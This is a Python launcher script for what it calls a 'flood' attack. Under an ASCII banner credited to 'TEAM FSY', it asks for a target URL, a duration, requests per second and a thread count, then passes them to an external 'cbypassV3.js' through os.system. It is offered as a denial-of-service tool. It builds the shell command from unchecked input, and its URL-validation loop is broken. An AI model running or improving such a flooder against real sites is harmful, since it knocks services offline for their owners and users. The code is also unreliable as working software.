#!/usr/bin/env python3
import os
import time
from colorama import Fore, Style, init
init(autoreset=True)

#ui 
print(Fore.RED + Style.BRIGHT + """
 ███████████  █████████  █████ █████
░░███░░░░░░█ ███░░░░░███░░███ ░░███ 
 ░███   █ ░ ░███    ░░░  ░░███ ███  
 ░███████   ░░█████████   ░░█████   
 ░███░░░█    ░░░░░░░░███   ░░███    
 ░███  ░     ███    ░███    ░███    
 █████      ░░█████████     █████   
░░░░░        ░░░░░░░░░     ░░░░░    
                                    
""")
print(Fore.RED + "V2-RAW — DEVELOPED BY TEAM FSY\n")

while True:
    target = input(Fore.WHITE + "Target URL → ").strip()
    if not target.startswith("http"):
        target = "https://" + target
        print(Fore.RED + Style.BRIGHT + "[!] Error: Wrong target input. Please enter a valid address.\n")
        continue
    else:
        break

time = input(Fore.WHITE + "Time sec (60-120 or more) → ").strip()
rps = input(Fore.WHITE + "RPS (8-10 or more) → ").strip()
threads = input(Fore.WHITE + "Threads (1-10 or more) → ").strip()

#flood js useage
cmd = f"node cbypassV3.js {target} {time} {rps} {threads}"
print(Fore.GREEN + "[*] Launching JavaScript...\n")
os.system(cmd)
